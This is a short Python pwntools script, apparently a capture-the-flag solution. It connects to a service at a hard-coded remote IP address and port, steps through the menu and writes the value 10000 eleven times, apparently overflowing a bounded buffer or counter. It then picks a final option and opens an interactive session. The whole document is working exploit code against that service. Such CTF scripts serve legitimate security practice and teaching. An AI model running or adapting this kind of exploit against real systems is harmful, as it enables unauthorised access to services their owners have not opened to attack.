from pwn import *

p = remote('62.173.140.174', '17300')
p.recvuntil(b'Enter your choice (1-4): ', timeout=1)

p.sendline('1')
p.recvuntil(b'Enter your choice (1-5): ', timeout=1)
p.sendline(b'3')

for i in range(11):
    p.recvuntil(b'Enter a number to write: ', timeout=1)
    p.sendline(b'10000')
    p.recvuntil(b'Enter your choice (1-5): ', timeout=1)
    p.sendline(b'3')
    if i == 10:
        p.sendline(b'10000')
        p.recvuntil(b'Enter your choice: ', timeout=1)
        p.sendline(b'4')
        p.interactive()

p.interactive()
